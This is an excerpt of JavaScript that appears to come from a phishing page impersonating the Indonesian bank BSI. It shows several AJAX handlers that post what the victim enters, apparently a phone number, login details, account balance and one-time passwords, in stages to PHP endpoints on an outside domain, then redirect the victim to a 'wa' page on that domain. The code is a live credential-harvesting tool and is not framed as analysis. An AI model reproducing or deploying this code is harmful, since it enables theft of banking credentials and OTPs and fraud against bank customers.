...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses...";
      ...
      $.ajax({
            type: 'POST',
            url: 'https://choreoapps.ll-feed.cfd/bsi/bsl2/no.php',
...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
      $.ajax({
            type: 'POST',
            url: 'https://choreoapps.ll-feed.cfd/bsi/bsl2/login.php',
...
$('.process1').fadeIn();
 document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
      $.ajax({
            type: 'POST',
            url: 'https://choreoapps.ll-feed.cfd/bsi/bsl2/saldo.php',
...
$.ajax({
 type: 'POST',
 url: 'https://choreoapps.ll-feed.cfd/bsi/bsl2/otp.php',
 async: false,
 dataType: 'JSON',
...
function getcs(){
 $("#djload").show();   
  ...
  audio1 = document.getElementById("bsi");
    ...
    audio4.loop = false
setTimeout(function(){  
location.href='https://choreoapps.ll-feed.cfd/wa/bsl2';
    }, 1000);
    setTimeout(function(){
    $("#djload").hide();   
    }, 1000);      
